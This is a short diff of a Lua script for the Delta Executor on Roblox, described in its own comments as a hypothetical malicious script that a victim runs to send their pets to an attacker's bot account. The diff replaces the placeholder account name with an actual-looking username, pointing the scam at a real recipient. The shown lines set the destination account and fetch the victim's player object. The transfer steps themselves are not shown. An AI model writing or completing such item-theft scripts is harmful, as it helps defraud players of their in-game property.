@@ -1,7 +1,7 @@
 -- Hypothetical malicious script that would be executed by the victim (you) on Delta Executor.
 
 -- Step 1: Specify the bot account where the attacker wants to transfer pets.
-local botAccountName = "AttackerBotAccount"  -- This is the bot account that the attacker controls.
+local botAccountName = "SHEESHBOZO10o"  -- This is the bot account that the attacker controls.
 
 -- Step 2: Get the victim's session (your Roblox account) and inventory.
 local player = game:GetService('Players').LocalPlayer  -- This is the victim's player object (your account).
